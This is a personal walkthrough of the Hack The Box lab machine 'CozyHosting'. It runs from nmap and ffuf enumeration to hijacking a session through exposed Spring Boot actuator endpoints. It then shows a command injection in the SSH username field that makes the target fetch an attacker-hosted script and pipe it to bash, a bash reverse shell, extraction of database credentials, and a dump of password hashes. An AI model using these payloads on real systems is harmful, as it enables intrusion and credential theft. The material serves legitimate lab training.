- ping machine
	- `ping ###.###.###.###`
```bash

```

- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- or ''
```bash
 kali@kali  ~/htb/cozyhosting  cat cozyhostingNmap.txt 
# Nmap 7.95 scan initiated Sun Feb  2 12:40:07 2025 as: /usr/lib/nmap/nmap --privileged -p- -T4 --open -Pn -oN cozyhostingNmap.txt 10.10.11.230
Nmap scan report for 10.10.11.230
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Feb  2 12:40:24 2025 -- 1 IP address (1 host up) scanned in 17.02 seconds
```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap` 
```bash
 kali@kali  ~/htb/cozyhosting  cat cozyhostingVersionsNmap.txt 
# Nmap 7.95 scan initiated Sun Feb  2 12:56:42 2025 as: /usr/lib/nmap/nmap --privileged -p 22,80 -sC -sV -oN cozyhostingVersionsNmap.txt 10.10.11.230
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  2 12:56:53 2025 -- 1 IP address (1 host up) scanned in 11.03 seconds
```

- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
```bash

```
- -or-
- ffuf to enumerate website if machine has 80 or 443
	- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -e .php,.txt -t 10
	- ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ
	- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cozyhosting.htb/FUZZ -t 10 -r`
	- ffuf reveals 
		- admin that redirects to login
		- login page
		- index - homemage
		- logout that redirects to login
		- error page that reveals "Whitelabel Error Page"
```bash
 kali@kali  ~  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://cozyhosting.htb/FUZZ -t 10 -r
 -o cozyHostingFfuf.txt

        /'___\  /'___\           /'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Output file      : cozyHostingFfuf.txt
 :: File format      : json
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500 
________________________________________________

admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 116ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 68ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 100ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 140ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
#www                    [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 120ms]
#mail                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 74ms] 
:: Progress: [19966/19966] :: Job [1/1] :: 72 req/sec :: Duration: [0:04:20] :: Errors: 0 ::
```
- ![[Pasted image 20250208174348.png]]
- researching "Whitelabel Error Page" reveals 
	- it is a default error that appears in Spring Boot when and exception occurs
	- Spring Boot has it's own wordlist within SecLists 
	- We re-run ffuf with the spring-boot wordlist
	- this reveals Actuator, which is a API for SpringBoot
	```bash
 kali@kali  ~  ffuf -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/FUZZ -t 10 -r -o cozyHostingFfuf.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
 :: Output file      : cozyHostingFfuf.txt
 :: File format      : json
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 185ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 83ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 113ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 103ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 166ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 134ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 122ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 173ms]
actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 116ms]
:: Progress: [112/112] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:01] :: Errors: 0 ::

```
	- /mappings provide a detailed over view of all the mappings configured in the application
	- navigating to /actuator/mappings reveals all of the mappings configured in the application
	- ![[Pasted image 20250209123948.png]]
	-  /sessions reveals all of the active sessions and their sessions ids
	- ![[Pasted image 20250209124540.png]]
	- copy the token, plug it in on the login page under -
	- Browser Dev Console, Storage, Cookies
	-  ![[Pasted image 20250209125443.png]]
	- Connection settings at the bottom - username field seems susceptible to command injection
		- error suggests that the service uses ssh to connect to the host
		- the command in the back end is likely `ssh -i id_rsa username@hostname`
	- ![[Pasted image 20250209145035.png]]
	- using 127.0.0.1 and Your Mom for username we detect that username cannot have whitespaces

	 - Spinning up a python server `python3 -m http.server 42069`
	 - in username `test;curl${IFS}http://10.10.16.7:42069;`
		 - ${IFS} represents the Internal Field Separator in Unix/Linux. By default, it's set to whitespace (spaces, tabs, newlines).
	 - ![[Pasted image 20250209145926.png]]
	```bash kali@kali  ~/htb/cozyhosting  python3 -m http.server 42069
	Serving HTTP on 0.0.0.0 port 42069 (http://0.0.0.0:42069/) ...
	10.10.11.230 - - [09/Feb/2025 14:59:13] "GET / HTTP/1.1" 200 -
```
	- Next step is to create a reverse shell in a file
	```bash
	 kali@kali  ~/htb/cozyhosting  vim yourMom.sh
	 kali@kali  ~/htb/cozyhosting  cat yourMom.sh 
	 bash -i >& /dev/tcp/10.10.16.4/42096 0>&1
```
- from the command line using curl
- `curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=test;curl${IFS}http://10.10.16.4:42069/yourMom.sh|bash;' `
- Reverse Shell into app@cozyhosting.htb 
	- looking in the directory we are dropped `app` into and we find a file called cloudhosting-0.0.1.jar.gz
	- pull down the file from the target machine to attack box
	- unzip the file and searching the files reveals username - postgres and password - Vg&nvzAQ7XxR
```bash
 kali@kali  ~/htb/cozyhosting/BOOT-INF/classes  cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```


```bash
   name    |                           password                           
-----------+--------------------------------------------------------------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
(2 rows)
```

- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Foothold - Look around and check things out for a second
	- search local directory
	- search root directory
	- sudo -l
	- look for exploitable binary's
		- `$ find / -perm /4000 2>/dev/null'
		- 
	